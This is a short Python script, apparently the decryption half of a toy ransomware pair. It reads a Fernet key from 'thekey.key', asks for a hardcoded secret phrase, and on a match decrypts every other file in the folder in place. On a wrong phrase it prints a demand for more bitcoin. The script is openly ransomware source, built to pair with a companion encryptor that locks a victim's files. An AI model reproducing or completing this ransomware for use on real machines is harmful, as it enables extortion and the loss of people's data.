# Decryption python Program

# shebang

#!/usr/bin/env python3

# Importing essential python packages

import os
from cryptography.fernet import Fernet

# Creating List named files
files=[]

# Inserting every file from folder in files(list)
for file in os.listdir():
# Checking files or Avoiding python files
    if (file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py"):
        continue
# Checking only file will be taken as input
    if os.path.isfile(file):
        files.append(file)

# Printing the files list
print(files)

# Opening the "thekey.key" file in reading mode & store it in secretkey variable
with open("thekey.key","rb") as key:
    secretkey=key.read()

# Creating a Secret Phrase 
secretphrase = "123456"

# taking a user input for secret Phrase
usr_inp = input("Enter the Secret Phrase to further process:\n")

# Checking Users Secret phrase value is matched or not
if (usr_inp == secretphrase):

    for file in files:
        with open(file,"rb") as thefile:
            content=thefile.read()
# Statement for Decrypting the files
            content_decrypted = Fernet(secretkey).decrypt(content)
            
        with open(file,"wb") as thefile:
            thefile.write(content_decrypted)
            
            print("CONGRATULATION'S!!!!!")
            print("Your files are Decrypted Now !!!!")

else:

    print("OOP'S WRONG phrase!!!!")
    print("Give me MORE BITCOIN'S...")
